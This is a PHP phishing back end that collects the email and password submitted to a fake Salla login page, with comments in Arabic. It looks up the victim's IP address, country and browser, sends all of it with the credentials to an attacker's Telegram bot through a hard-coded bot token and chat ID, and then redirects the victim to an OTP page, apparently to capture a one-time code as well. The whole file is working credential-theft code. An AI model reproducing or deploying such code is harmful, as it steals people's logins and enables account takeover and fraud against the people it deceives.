<?php

$botToken = "8125381566:AAGfyKuODnK_RufFKXOQ15tS9ar_lBFBot4";
$chatId = "-4625923889";


$email = $_POST['email'];
$password = $_POST['password'];
$remember = isset($_POST['remember']) ? 'نعم' : 'لا';


if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $userIP = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $userIP = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $userIP = $_SERVER['REMOTE_ADDR'];
}


$ipInfo = file_get_contents("http://ip-api.com/json/$userIP?fields=country,region,city,isp,timezone");
$ipData = json_decode($ipInfo, true);
$country = $ipData['country'] ?? 'غير معروف';


$countryCode = strtolower($ipData['countryCode'] ?? ''); // رمز الدولة (مثل "US" أو "EG")
$flagEmoji = ''; 

if ($countryCode) {
    $flagEmoji = mb_convert_encoding('&#' . (127397 + ord($countryCode[0])) . ';', 'UTF-8', 'HTML-ENTITIES');
    $flagEmoji .= mb_convert_encoding('&#' . (127397 + ord($countryCode[1])) . ';', 'UTF-8', 'HTML-ENTITIES');
}


$userAgent = $_SERVER['HTTP_USER_AGENT'];


$message = "╭━─━≪ Info ❄️ ≫─━━╮\n\n";
$message .= "Iتسجيل دخول سلةI\n\n";
$message .= "email : $email\n";
$message .= "pass : $password\n\n";
$message .= "------------------------\n\n";
$message .= "IP Address: $userIP $flagEmoji ($country)\n\n";  // إضافة علم الدولة مع IP
$message .= "User Agent: $userAgent\n";
$message .= "╰━─━≪ Info ❄️ ≫─━━╯";


$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
file_get_contents($url);


header("Location: /sa/otp");
exit();
?>
